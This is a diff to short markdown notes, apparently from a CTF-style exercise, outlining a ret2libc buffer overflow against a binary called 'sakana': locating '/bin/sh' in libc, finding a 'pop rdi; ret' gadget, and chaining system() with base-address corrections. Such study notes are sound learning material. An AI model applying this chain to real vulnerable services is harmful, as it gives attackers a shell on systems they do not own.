@@ -1,5 +1,5 @@
 ## Some Notes
-1. There is the string "/bin/sh" in memory address 0x7f31bc4c55bd.
+1. There is the string "/bin/sh" in memory address 0x7f31bc4c55bd. (the virtual memory address is radom)
 ```
 [+] Searching '/bin/sh' in memory
 [+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7f31bc4ab000-0x7f31bc4f9000), permission=r--
@@ -12,8 +12,8 @@ gef➤  x/bs 0x7f31bc4c55bd
 ❯ ROPgadget --binary sakana --only 'pop|ret' | grep 'rdi'
 0x00000000000023a3 : pop rdi ; ret
 ```
-3. Overflow the buffer to cover the original return address ($rbp+8) with 0x00000000000023a3
-4. Overflow the buffer to put the address of "bin/sh" in ($rbp+16)
-5. Overflow the buffer to put the address of system() (0x52290)
+3. Overflow the buffer to cover the original return address ($rbp+8) with 0x23a3 + sakana_base_addr
+4. Overflow the buffer to put the address of "bin/sh" in ($rbp+16) + libc_base_addr
+5. Overflow the buffer to put the address of system() (0x52290) in ($rbp+24) + libc_base_addr
 6. leave; ret (pop rip)
 7. rip will point to the address of the ROP gadget
